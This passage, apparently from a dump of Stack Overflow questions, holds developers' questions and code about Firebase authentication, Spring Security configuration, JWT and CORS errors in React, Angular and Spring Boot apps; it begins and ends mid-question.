                        value={search}
                        onChange={handleSearch}
                        style={styles.inputContainer}
                    /&gt;
                    &lt;Label style={{ fontWeight: '700' }}&gt;{En.lookFor}&lt;/Label&gt;
                &lt;/View&gt;
            &lt;/View&gt;
            &lt;ScrollView
                bounces={false}
                overScrollMode='never'
                showsVerticalScrollIndicator={false}
            &gt;
                &lt;View style={styles.container}&gt;
                    &lt;Label style={{ fontWeight: '700' }}&gt;{En.operations}&lt;/Label&gt;
                    &lt;Label style={{ fontWeight: '700' }}&gt;{En.subCategoryName}&lt;/Label&gt;
                    &lt;Label style={{ fontWeight: '700' }}&gt;.{En.serialNumber}&lt;/Label&gt;
                &lt;/View&gt;
                &lt;View style={styles.categorView}&gt;
                    {loading ? &lt;ActivityIndicator size={35} color={COLOR.red} style={{ marginTop: hp(2) }} /&gt;
                        :
                        renderData?.map((item, index) =&gt; (
                            &lt;CategoriesView
                                text={item?.studyName}
                                key={index}
                                number={getSerialNumber(index)}
                                firstHeading={En.edit}
                                secondHeading={En.delete}
                                onFirstPress={() =&gt; navigation.navigate(SCREEN.ADD_CATEGORIES_NOTE, { isEdit: true, parentId: documentId, data: item })}
                                onSecondPress={() =&gt; handleDeleteItem(item?.documentId)}
                            /&gt;
                        ))}
                &lt;/View&gt;
            &lt;/ScrollView&gt;
            &lt;ListFooter
                note={noteString}
                showPreviousButton={showPreviousButton}
                moveToNextPage={moveToNextPage}
                moveToPreviousPage={moveToPreviousPage}
                currentPage={currentPage}
                showNextButton={showNextButton}
            /&gt;
        &lt;/Layout&gt;
    )
}
export default CategoryContentScreen
const styles = StyleSheet.create({
    inputContainer: {
        width: wp('10%'),
        borderRadius: hp(1),
        marginHorizontal: '1%',
        height: hp(5.7),
    },
    headerStyle: {
        ...commonStyles.justifyView,
        paddingHorizontal: '5%',
    },
    buttonStyle: {
        width: wp(20),
        ...commonStyles.center,
        height: hp(5)
    },
    container: {
        height: hp(6),
        width: '90%',
        marginHorizontal: '5%',
        backgroundColor: COLOR.secondary,
        borderRadius: hp(4),
        paddingHorizontal: '3%',
        justifyContent: 'space-between',
        flexDirection: 'row',
        marginTop: '0.5%',
        alignItems: 'center',
        marginVertical: '1%',
    },
})
</code></pre>
<p>And this is the firebaseServices.js</p>
<pre class=""lang-js prettyprint-override""><code>import { signInWithEmailAndPassword } from 'firebase/auth'
import { addDoc, collection, getDocs, getDoc, doc, updateDoc, setDoc, where, deleteDoc, serverTimestamp } from 'firebase/firestore'
import { getDownloadURL, ref, uploadBytes } from 'firebase/storage'
import { FIREBASE_AUTH, STORAGE_CONFIG, FIRESTORE_DB } from '../../firebaseConfig'
import En from '../data/locals/En'

const loginWithEmail = async (email, password, callBack) =&gt; {
  signInWithEmailAndPassword(FIREBASE_AUTH, email, password)
    .then(async data =&gt; {
      callBack(data)
    })
    .catch(error =&gt; {
      callBack()
      if (error.code === 'auth/invalid-credential') {
        alert(En.invalidCredentials)
      }
    })
}

const getCollectionData = async table =&gt; {
  let data = []

  let querySnapshot = await getDocs(collection(FIRESTORE_DB, table))
  querySnapshot.forEach(function (doc) {
    if (doc.exists) {
      data.push({ ...doc.data() })
    } else {
      console.log('No document found!')
    }
  })
  return data
}

const getCollectionDataWhere = async (table, key, value) =&gt; {
  try {
    const querySnapshot = await getDocs(collection(FIRESTORE_DB, table), where(key, '==', value))

    if (querySnapshot?.empty) {
      console.log('No documents found with', key, '=', value)
      return null
    }

    const data = []
    querySnapshot.forEach((doc) =&gt; {
      data.push({ id: doc.id, ...doc.data() })
    })

    return data
  } catch (error) {
    console.error('Error fetching document:', error)
    return null
  }
}

const getDocumentById = async (collectionName, documentId) =&gt; {
  try {
    const docRef = doc(FIRESTORE_DB, collectionName, documentId)
    const docSnapshot = await getDoc(docRef)

    if (docSnapshot.exists()) {
      return { id: docSnapshot?.id, ...docSnapshot?.data() }
    } else {
      console.log('No document found with ID:', documentId)
      return null
    }
  } catch (error) {
    console.error('Error fetching document:', error)
    return null
  }
}

const addDocument = async (coll, jsonObject) =&gt; {
  try {
    const docRef = await addDoc(collection(FIRESTORE_DB, coll), {
      ...jsonObject,
      documentId: null,
      createdAt: serverTimestamp(),
    })

    const documentId = docRef.id
    await updateDoc(docRef, { documentId })
    console.log('Document written with ID: ', documentId)
    return documentId
  } catch (e) {
    console.error('Error adding document: ', e)
    return null
  }
}

const deleteDocument = async (coll, documentId) =&gt; {
  try {
    return await deleteDoc(doc(FIRESTORE_DB, coll, documentId))
  } catch (e) {
    console.error('Error adding document: ', e)
    return null
  }
}

const saveData = async (coll, documentId, jsonObject) =&gt; {
  try {
    const docRef = doc(FIRESTORE_DB, coll, documentId)
    await setDoc(docRef, { ...jsonObject, capital: true, updatedAt: serverTimestamp(), }, { merge: true })
    return docRef.id
  } catch (e) {
    console.error('Error adding document: ', e)
    return null
  }
}

const uploadImage = async (imageUri, folder) =&gt; {
  try {
    const response = await fetch(imageUri)
    const blobFile = await response.blob()

    const storageRef = ref(STORAGE_CONFIG, `${folder}/` + new Date().toISOString())

    const result = await uploadBytes(storageRef, blobFile)
    const url = await getDownloadURL(result.ref)

    return url
  } catch (err) {
    console.error('Error uploading image:', err)
    throw err
  }
}

export { addDocument, loginWithEmail, uploadImage, getCollectionDataWhere, getDocumentById, getCollectionData, saveData, deleteDocument }
</code></pre>
"
"<p>I wanted to know how i can refresh the firebase access token when it expires. I need the access token for api authentication. I have tried to find it online but can't seem to find anything with next-auth and firebase.</p>
<p>This is what i have right now. I am able to get the access token just not able to refresh when it expires. So after some time i get the api authentication error.</p>
<pre><code>import { auth } from &quot;@/config/firebaseApp&quot;;
import { signInWithEmailAndPassword } from &quot;firebase/auth&quot;;
import { AuthOptions } from &quot;next-auth&quot;;
import NextAuth from &quot;next-auth/next&quot;;
import CredentialsProvider from &quot;next-auth/providers/credentials&quot;;

const authOptions: AuthOptions = {
  pages: {
    signIn: &quot;/signIn&quot;,
  },
  session: {
    strategy: &quot;jwt&quot;,
  },
  providers: [
    CredentialsProvider({
      type: &quot;credentials&quot;,
      credentials: {},
      authorize: async (credentials): Promise&lt;any&gt; =&gt; {
        return await signInWithEmailAndPassword(
          auth,
          (credentials as any).email || &quot;&quot;,
          (credentials as any).password || &quot;&quot;
        )
          .then(async (userCredentials) =&gt; {
            const dummy = {
              role: &quot;admin&quot;,
            };

            if (userCredentials.user) {
              return {
                ...userCredentials.user,
                role: dummy.role || &quot;user&quot;,
                access_token: await userCredentials.user.getIdToken(),
              };
            }
            return null;
          })
          .catch((err) =&gt; {
            console.log(err.message);
          });
      },
    }),
  ],

  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.role = user.role;
        token.access_token = user.access_token;
      }
      return token;
    },

    async session({ session, token }) {
      if (session.user) {
        session.user.role = token.role;
      }

      return session;
    },
  },
};

const handler = NextAuth(authOptions);

export { handler as GET, handler as POST };
</code></pre>
<p>Also I am a beginner so correct me if I am doing something wrong here.</p>
"
"<h3>What I am trying to achieve</h3>
<p>I am trying to implement Spring Security with REST API and React as frontend with basic authentication (I am not planning on using JWT because it is overkill for my project). This is my first time implementing security, so I am feeling a bit lost. I am using Spring Spring Boot 3.2.1 and most of the articles online are deprecated.</p>
<h3>What I have done so far</h3>
<p>Load users from database using JDBC</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
public UserDetailsService userDetailsService(DataSource dataSource) {
    return new JdbcUserDetailsManager(dataSource);
}
</code></pre>
<p>Security Filter Chain</p>
<pre class=""lang-java prettyprint-override""><code>@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    return http.authorizeHttpRequests(requests -&gt;
            requests
                    .requestMatchers(HttpMethod.GET, &quot;/restaurant/**&quot;, &quot;/menu/**&quot;).permitAll()
                    .requestMatchers(HttpMethod.POST, &quot;/register&quot;).permitAll()
                    .anyRequest().authenticated()
    )
            .cors(Customizer.withDefaults())
            .csrf(csrf -&gt; csrf.disable())
            .httpBasic(Customizer.withDefaults())
            .build();
}
</code></pre>
<p>Authentication Controller</p>
<pre class=""lang-java prettyprint-override""><code>@GetMapping(&quot;/login&quot;)
public ResponseEntity&lt;?&gt; loginUser() {
    return new ResponseEntity&lt;&gt;(&quot;Authentication successful&quot;, HttpStatus.OK);
}
</code></pre>
<p>Authorize users with React</p>
<pre class=""lang-js prettyprint-override""><code>const authorize = () =&gt; {
    fetch(&quot;http://localhost:8080/login&quot;, {
        headers: { &quot;Authorization&quot;: 'Basic ' + window.btoa(email + &quot;:&quot; + password) }
    }).then(response =&gt; console.log((response.ok === true) ? &quot;successful&quot; : &quot;unsuccessful&quot;));
}
</code></pre>
<p>Password encoder, CORS configuration, registration controller, and entities are left out for simplicity.</p>
<h3>Problems</h3>
<ul>
<li>Because <code>/login</code> endpoint is only accessible to authenticated user, it should return <code>200</code> if proper authentication details is sent and <code>401</code> otherwise. But I am guessing this does not use <code>SecurityContextHolder</code> to authenticate user if the user was already authenticated beforehand and it is fetching user details from database on each call. How can I ensure the context is being utilized to authenticate users?</li>
<li>Let's say I want to make a call to an authenticated endpoint such as <code>/order</code>, would I have to add <code>Authorization</code> header on each call? Is there a way to store whether the user is authenticated or not for a certain amount of time? Other threads suggested that <code>localStorage</code> and cookies are unsafe methods.</li>
</ul>
"
"<p>I am creating a app where the backend is written in kotling with spring boot.
I have CRUD operations, just the basics of the app that works locally.
Now i want to connect the CRUD to a cloud db such as google firebase.
I cannot find any description or videos of how to do this with kotling spring boot.
Can anyone please help me with this?</p>
<p>I have tried similar approuches for kotlin as for java, but it doesnt work.</p>
"
"<p>I have the following problem to solve: we have different types of parameters in the application (java + spring 5). If the parameter is of the system type, only the administrator can see/edit/add/delete it. I have a domain service that calls repositoryAdapter, which runs the dao. I want to secure all methods at the service level, for example:</p>
<pre><code>@PostFilter(&quot;@securityContext.hasAuthority('admin') or filterObject.configurationType.value != 2&quot;)
List&lt;Parameter&gt; getParameters() { ...}
</code></pre>
<pre><code>@PreAuthorize(&quot;@securityContext.hasAuthority('admin') or #parameter.configurationType.value != 2&quot;)
Parameter addParameter(Parameter parameter) { ...}
</code></pre>
<p>I have 3 questions:</p>
<ol>
<li><p>Is this a good approach? I cannot put such authorization at the controller level, securing a given URL, because the parameters are sometimes returned from the API as a file, sometimes imported from a file, etc.</p>
</li>
<li><p>Is there any way (maybe an aspect?) to protect methods that will be added in the future, in case someone adds method without proper annotation, e.g.</p>
</li>
</ol>
<pre><code>Stream&lt;Parameter&gt; getParametersAsStream() { ...}
</code></pre>
<ol start=""3"">
<li>I have a problem with updating the parameter, when type of the parameter changes from system (which should be secured too) because this checking mechanism will not work. I dont' want to remove the parameter and add it in the service above, because I don't want to have a unnecessary operations in entity audit. The can add current type of the parameter (or the entire parameter) to the service method and secured with an annotation. Then check in the method itself whether the type is correct (if not, throw exception), e.g.:</li>
</ol>
<pre><code>@PreAuthorize(&quot;@securityContext.hasAuthority('admin') or (#currentConfigurationType != 2 and #parameter.configurationType.value != 2)&quot;)
Parameter updateParameter(int currentConfigurationType, Parameter parameter) { 
    if(getParameterFromRepo.configurationType.value != currentConfigurationType) {
        throw new IllegalArgumentException()
    }
    ...
}
</code></pre>
"
"<p>Trying to add security filters to my spring native application which was gonna deploy on aws lambda. So took a help of sample example of <a href=""https://github.com/aws/serverless-java-container/tree/main/samples/springboot3/pet-store-native"" rel=""nofollow noreferrer"">pet-store-native</a>(spring boot + graalvm + aws serverless application). But adding filters to it, not working in an expected way.</p>
<p>Things not working as expected :</p>
<ol>
<li>.authorizeHttpRequests is not authorising request as specified.</li>
<li>Some filters are running inside security filter chain and some are running outside it.</li>
</ol>
<p>Security Configuration.class -&gt;</p>
<pre><code>@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
            .csrf(csrf -&gt; csrf.disable())
            .cors(cors -&gt; cors.disable())
            .authorizeHttpRequests(auth -&gt; {
                auth
                        .requestMatchers(&quot;/pets&quot;).authenticated()
                        .anyRequest().permitAll();
                // .anyRequest().permitAll();
            })
            .addFilterAfter(outsideFilter, CorsFilter.class)
            .addFilterAfter(simpleFilter, UsernamePasswordAuthenticationFilter.class)
            .sessionManagement(
                    sm -&gt; sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS).sessionFixation().none());

    return http.build();
}
</code></pre>
<p>OutsideProjectFilter.class (Using OncePerRequestFilter) -&gt;</p>
<pre><code>    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
            System.out.println(&quot;Running a filter outisde the current project.&quot;);

            filterChain.doFilter(request, response);
    }
</code></pre>
<p>SimpleFilter.class (Using OncePerRequestFilter) -&gt;</p>
<pre><code>    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        System.out.println(&quot;Running a simple filter&quot;);
    
        filterChain.doFilter(request, response);
    }
</code></pre>
<p>DemoApplication.class -&gt;</p>
<pre><code>@SpringBootApplication(scanBasePackages = {&quot;com.sample.filters&quot;,&quot;com.amazonaws.serverless.sample.springboot3&quot;})
public class DemoApplication {
</code></pre>
<p>Trace Showing filters running outside filter chain -&gt;</p>
<p><a href=""https://i.stack.imgur.com/hK66r.png"" rel=""nofollow noreferrer"">Trace log</a></p>
<p>And even specifying .requestMatchers(&quot;/pets&quot;).authenticated(), able to access this endpoint.</p>
<p><a href=""https://i.stack.imgur.com/jLmFE.png"" rel=""nofollow noreferrer"">Making curl request</a></p>
<p>Implementation - <a href=""https://github.com/AniS-03/demo-aws-serverless-web-native-app"" rel=""nofollow noreferrer"">Source code on Github</a></p>
"
"<p>I have a react app connected to firebase that has 3 roles. Admin, user, and tutor. I have added the code to check the role on sign in and redirect appropriately based on the role. However, even when I login as user, I can see that the app first loads the admin page (log statements from admin component printed ) and then redirects to the user component. If I logout and then login as an author now, first the admin component is mounted, then the user component and finally I land on the author component. I am identifying this via <code>console.log</code> statements.</p>
<p>The code is as below.</p>
<pre><code>export default function LoginSignup() { 
    const signIn = async (e) =&gt; { 
        e.preventDefault(); 
        if (email &amp;&amp; password) { 
            await signInWithEmailAndPassword(firebaseAuth, email, password) 
                .then(async (user) =&gt; { 
                    const q = query(userCollection, where(&quot;email&quot;, &quot;==&quot;, email)); 
                    const querySnapshot = await getDocs(q); 
                    querySnapshot.forEach((doc) =&gt; { 
                        console.log(&quot;//////////////&quot; + doc.data().role);
                        setRole(doc.data().role); 
                        setUser(user.user);
                        if (doc.data().role == &quot;admin&quot;) {
                          navigate(&quot;/admin&quot;);
                        } else if (doc.data().role == &quot;user&quot;) {
                          navigate(&quot;/user&quot;);
                        } else if (doc.data().role == &quot;author&quot;) {
                          navigate(&quot;/author&quot;);
                        } else {
                          console.log(&quot;role undefined&quot;);
                        }
                      });
                })
                .catch(async (error) =&gt; {
                      alert(error)
                });
                handlerEmail(&quot;&quot;);
                handlerPassword(&quot;&quot;);
          }
        }; 
} 
</code></pre>
<pre><code>export default function AdminDashboard() { 
    useEffect(() =&gt; {
        onAuthStateChanged(firebaseAuth, (currentUser) =&gt; {
            if (currentUser) {
                console.log(&quot;admin dash&quot;);
                setUser(currentUser);
            } else 
                navigate(&quot;/&quot;);
        });
    }, []); 
}
</code></pre>
<p>When I log in as an admin I am redirected to admin dash, no problems there. Next when I log in as a user, the console statement from admin dash is first printed and then <code>&quot;//////////////&quot; + user&quot;</code> (log statement from loginsignup.jsx) is printed and then user dashboard component is loaded.</p>
<p>It is an issue only if I login with other roles before. If I first login as user then this doesn't occur.</p>
<p>Logged in as admin, logged out, then logged in as user. First <code>useEffect()</code> of admin component was triggered before loading the user component.</p>
"
"<pre><code>org.springframework.beans.factory.BeanDefinitionStoreException: I/O failure while processing configuration class [org.springframework.web.filter.GenericFilterBean]
    at org.springframework.context.annotation.ConfigurationClassParser.processConfigurationClass(ConfigurationClassParser.java:251) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.parse(ConfigurationClassParser.java:189) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.doProcessConfigurationClass(ConfigurationClassParser.java:314) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.processConfigurationClass(ConfigurationClassParser.java:246) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.parse(ConfigurationClassParser.java:197) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.parse(ConfigurationClassParser.java:165) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassPostProcessor.processConfigBeanDefinitions(ConfigurationClassPostProcessor.java:416) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassPostProcessor.postProcessBeanDefinitionRegistry(ConfigurationClassPostProcessor.java:289) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanDefinitionRegistryPostProcessors(PostProcessorRegistrationDelegate.java:349) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:118) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:788) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:606) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) ~[spring-boot-3.2.2.jar:3.2.2]
    at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:456) ~[spring-boot-3.2.2.jar:3.2.2]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:334) ~[spring-boot-3.2.2.jar:3.2.2]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1354) ~[spring-boot-3.2.2.jar:3.2.2]
    at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) ~[spring-boot-3.2.2.jar:3.2.2]
    at in.gov.forest.wildlifemis.WildlifeMisApplication.main(WildlifeMisApplication.java:10) ~[classes/:na]
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]
    at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77) ~[na:na]
    at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na]
    at java.base/java.lang.reflect.Method.invoke(Method.java:568) ~[na:na]
    at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:50) ~[spring-boot-devtools-3.2.2.jar:3.2.2]
Caused by: java.io.FileNotFoundException: class path resource [jakarta/servlet/Filter.class] cannot be opened because it does not exist
    at org.springframework.core.io.ClassPathResource.getInputStream(ClassPathResource.java:215) ~[spring-core-6.1.3.jar:6.1.3]
    at org.springframework.core.type.classreading.SimpleMetadataReader.getClassReader(SimpleMetadataReader.java:54) ~[spring-core-6.1.3.jar:6.1.3]
    at org.springframework.core.type.classreading.SimpleMetadataReader.&lt;init&gt;(SimpleMetadataReader.java:48) ~[spring-core-6.1.3.jar:6.1.3]
    at org.springframework.core.type.classreading.SimpleMetadataReaderFactory.getMetadataReader(SimpleMetadataReaderFactory.java:103) ~[spring-core-6.1.3.jar:6.1.3]
    at org.springframework.boot.type.classreading.ConcurrentReferenceCachingMetadataReaderFactory.createMetadataReader(ConcurrentReferenceCachingMetadataReaderFactory.java:86) ~[spring-boot-3.2.2.jar:3.2.2]
    at org.springframework.boot.type.classreading.ConcurrentReferenceCachingMetadataReaderFactory.getMetadataReader(ConcurrentReferenceCachingMetadataReaderFactory.java:73) ~[spring-boot-3.2.2.jar:3.2.2]
    at org.springframework.core.type.classreading.SimpleMetadataReaderFactory.getMetadataReader(SimpleMetadataReaderFactory.java:81) ~[spring-core-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.asSourceClass(ConfigurationClassParser.java:630) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser$SourceClass.getInterfaces(ConfigurationClassParser.java:956) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.processInterfaces(ConfigurationClassParser.java:396) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.doProcessConfigurationClass(ConfigurationClassParser.java:342) ~[spring-context-6.1.3.jar:6.1.3]
    at org.springframework.context.annotation.ConfigurationClassParser.processConfigurationClass(ConfigurationClassParser.java:246) ~[spring-context-6.1.3.jar:6.1.3]
    ... 22 common frames omitted
</code></pre>
<p>I am trying to implement Jwt token in spring boot 3.2.2 but i am getting the above error. I am getting</p>
<pre><code>org.springframework.beans.factory.BeanDefinitionStoreException: I/O failure while processing configuration class [org.springframework.web.filter.GenericFilterBean]
</code></pre>
<pre><code>org.springframework.beans.factory.BeanDefinitionStoreException: I/O failure while processing configuration class [org.springframework.web.filter.GenericFilterBean]org.springframework.beans.factory.BeanDefinitionStoreException: I/O failure while processing configuration class [org.springframework.web.filter.GenericFilterBean]
</code></pre>
<pre><code>org.springframework.beans.factory.BeanDefinitionStoreException: I/O failure while processing configuration class [org.springframework.web.filter.GenericFilterBean]
</code></pre>
"
"<p>yes I know I am not the first one to ask this question, but as I have now been trying to fix this issue and not been able to for the past 16h I do not know any further. The problem is as follows. I have a WebSecurityConfig Class like so:</p>
<pre><code>@Configuration
@EnableMethodSecurity
public class WebSecurityConfig {
  @Autowired
  UserDetailsServiceImpl userDetailsService;

  @Autowired
  private AuthEntryPointJwt unauthorizedHandler;

  @Bean
  public AuthTokenFilter authenticationJwtTokenFilter() {
    return new AuthTokenFilter();
  }

  @Bean
  public DaoAuthenticationProvider authenticationProvider() {
    DaoAuthenticationProvider authProvider = new DaoAuthenticationProvider();

    authProvider.setUserDetailsService(userDetailsService);
    authProvider.setPasswordEncoder(passwordEncoder());

    return authProvider;
  }

  @Bean
  public AuthenticationManager authenticationManager(AuthenticationConfiguration authConfig) throws Exception {
    return authConfig.getAuthenticationManager();
  }

  @Bean
  public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
  }

  @Bean
  public CorsFilter corsFilter() {
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    CorsConfiguration config = new CorsConfiguration();
    config.addAllowedOrigin(&quot;*&quot;); // Zugriff von jeder URL erlauben
    config.addAllowedHeader(&quot;*&quot;);
    config.addAllowedMethod(&quot;*&quot;);
    source.registerCorsConfiguration(&quot;/**&quot;, config); // Für alle Pfade anwenden
    FilterRegistrationBean bean = new FilterRegistrationBean(new CorsFilter(source));
    bean.setOrder(Ordered.HIGHEST_PRECEDENCE);
    return new CorsFilter(source);
  }

  @Bean
  public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.addFilterBefore(corsFilter(), ChannelProcessingFilter.class)
        .addFilterBefore(authenticationJwtTokenFilter(), UsernamePasswordAuthenticationFilter.class)
        .csrf(csrf -&gt; csrf.disable())
        .exceptionHandling(exception -&gt; exception.authenticationEntryPoint(unauthorizedHandler))
        .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
        .authorizeHttpRequests(auth -&gt; auth.requestMatchers(&quot;/api/auth/**&quot;).permitAll().requestMatchers(&quot;/api/health/**&quot;)
            .permitAll().requestMatchers(&quot;/actuator/**&quot;).permitAll().anyRequest().authenticated())
        .authenticationProvider(authenticationProvider());
    http.cors(Customizer.withDefaults());
    return http.build();
  }
}
</code></pre>
<p>I have been trying to get cors to work properly but it just does not want to work. As far as I understand the problem is that spring security checks cors before making any more configuration meaning that the request does not get to the corsFilter that I have defined. Still all the solutions that I have found are eather contraticting, to old to be relevant or sometimes seem to have no effect on anything.</p>
<p>Below you can also find The Controller in question:</p>
<pre><code>@RestController
@RequestMapping(&quot;/api/auth&quot;)
public class AuthController {
    @Autowired
    AuthenticationManager authenticationManager;

    @Autowired
    UserRepository userRepository;

    @Autowired
    RoleRepository roleRepository;

    @Autowired
    PasswordEncoder encoder;

    @Autowired
    JwtUtils jwtUtils;

    @Autowired
    private SequenceGeneratorService generatorService;


    @PostMapping(&quot;/signin&quot;)
    public ResponseEntity&lt;?&gt; authenticateUser(@Valid @RequestBody LoginRequest loginRequest) {

        Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(loginRequest.getUsername(), loginRequest.getPassword()));

        SecurityContextHolder.getContext().setAuthentication(authentication);
        String jwt = jwtUtils.generateJwtToken(authentication);

        UserDetailsImpl userDetails = (UserDetailsImpl) authentication.getPrincipal();
        List&lt;String&gt; roles = userDetails.getAuthorities().stream()
                .map(item -&gt; item.getAuthority())
                .collect(Collectors.toList());

        return ResponseEntity.ok(new JwtResponse(jwt,
                userDetails.getId(),
                userDetails.getUsername(),
                userDetails.getEmail(),
                roles));
    }
[REDACTED]
</code></pre>
<p>I hope some of you might be able to point me in the right direction or help me find a solution to my problem.</p>
<p>I already tried implementing a varity of solutions such as:</p>
<ol>
<li>Defining the @CrossOrigin at the Method or Class Level</li>
<li>Defining a CorsConfig Class</li>
<li>Adding a varity of corsFilters, corsSourceSomethings to the WebSecurityConfig</li>
</ol>
"
"<p>I am writing an app that has a Java Spring back-end (providing an API) and an
Angular front-end.
The Java API works fine through Postman as far as I can see.</p>
<p>But when I try to connect the back-end to the front-end, by launching both
the Java app and the Angular app, going to http://localhost:4200 in a navigator and
fill a form (putting &quot;jseymour@gmail.uk&quot; and &quot;abcdefghi&quot; as password), I get a &quot;Cross Origin Request blocked&quot; error :</p>
<p>Here is the relevant code in my SecurityConfiguration Java class :</p>
<pre><code>  @Bean
    CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();

        configuration.setAllowedOrigins(List.of(&quot;http://localhost:4200&quot;));
        configuration.setAllowedMethods(List.of(&quot;GET&quot;, &quot;POST&quot;, &quot;DELETE&quot;));
        configuration.setAllowedHeaders(List.of(&quot;Authorization&quot;, &quot;Content-Type&quot;));

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();

        source.registerCorsConfiguration(&quot;/**&quot;, configuration);

        return source;
    }
</code></pre>
<p>and the relavant code in my AuthService class :</p>
<pre><code>import { Injectable } from '@angular/core';
import { Observable, throwError } from 'rxjs';
import { catchError, map } from 'rxjs/operators';
import {
  HttpClient,
  HttpHeaders,
  HttpErrorResponse,
} from '@angular/common/http';
import { Router } from '@angular/router';
import {ClientRegistrationInput} from &quot;../model/input/client-registration-input&quot;;
import {LoginInput} from &quot;../model/input/login-input&quot;;
import {UtilisateurOutput} from &quot;../model/output/utilisateur-output&quot;;
@Injectable({
  providedIn: 'root',
})
export class AuthService {
  endpoint: string = 'http://localhost:8000';
  headers = new HttpHeaders(); // .set('Content-Type', 'application/json');
  currentUser = {};

  constructor(private http: HttpClient, public router: Router) {
  }
  // Sign-up
  signUp(input: ClientRegistrationInput): Observable&lt;any&gt; {
    let api = `${this.endpoint}/auth/signup-customer`;
    return this.http.post(api, input).pipe(catchError(this.handleError));
  }
  // Sign-in
  signIn(loginInput: LoginInput) {
    return this.http
      .post&lt;any&gt;(`${this.endpoint}/auth/login`, loginInput)
      .subscribe((res: any) =&gt; {
        localStorage.setItem('access_token', res.token);
        this.getUserProfile(res.utilisateurId).subscribe((res) =&gt; {
          this.currentUser = res;
          this.router.navigate(['user-profile/' + res.utilisateurId]);
        });
      });
  }

  getToken() {
    return localStorage.getItem('access_token');
  }
  get isLoggedIn(): boolean {
    let authToken = localStorage.getItem('access_token');
    return authToken !== null;
  }
  // User profile
  getUserProfile(id: any): Observable&lt;UtilisateurOutput&gt; {
    let api = `${this.endpoint}/utilisateurs/${id}`;
    return this.http.get&lt;UtilisateurOutput&gt;(api, { headers: this.headers }).pipe(
      map((res) =&gt; {
        return res || {};
      }),
      catchError(this.handleError)
    );
  }
  doLogout() {
    localStorage.removeItem('access_token');
    this.router.navigate(['log-in']);

  }

  // Error handling
  handleError(error: HttpErrorResponse) {
    let msg = '';
    if (error.error instanceof ErrorEvent) {
      // client-side error
      msg = error.error.message;
    } else {
      // server-side error
      msg = `Error Code: ${error.status}\nMessage: ${error.message}`;
    }
    return throwError( () =&gt; new Error(msg));
  }
}

</code></pre>
<p>The error message in Google Chrome :</p>
<p><a href=""https://i.stack.imgur.com/3ieuI.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3ieuI.png"" alt=""enter image description here"" /></a></p>
<p>The error message in Firefox :</p>
<p><a href=""https://i.stack.imgur.com/UAx7X.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/UAx7X.png"" alt=""enter image description here"" /></a></p>
<p>Source code for Java back-end at <a href=""https://github.com/ewan-delanoy/ApiPlages"" rel=""nofollow noreferrer"">https://github.com/ewan-delanoy/ApiPlages</a>
Source code for Angular front-end at <a href=""https://github.com/ewan-delanoy/FrontEndPlages"" rel=""nofollow noreferrer"">https://github.com/ewan-delanoy/FrontEndPlages</a></p>
<p>Some notes on similar, older MSE questions :</p>
<p><a href=""https://stackoverflow.com/questions/24371734/firefox-cross-origin-request-blocked-despite-headers"">This one</a>
is about a Firefox-specific problem, while my problem appears in Chrome also.
<a href=""https://stackoverflow.com/questions/43871637/no-access-control-allow-origin-header-is-present-on-the-requested-resource-whe?rq=1"">This other one</a>
contains a lot of information and suggestions, in particular :</p>
<ol>
<li>Using a CORS proxy - I want to avoid that since I have full control over both backend and frontend.</li>
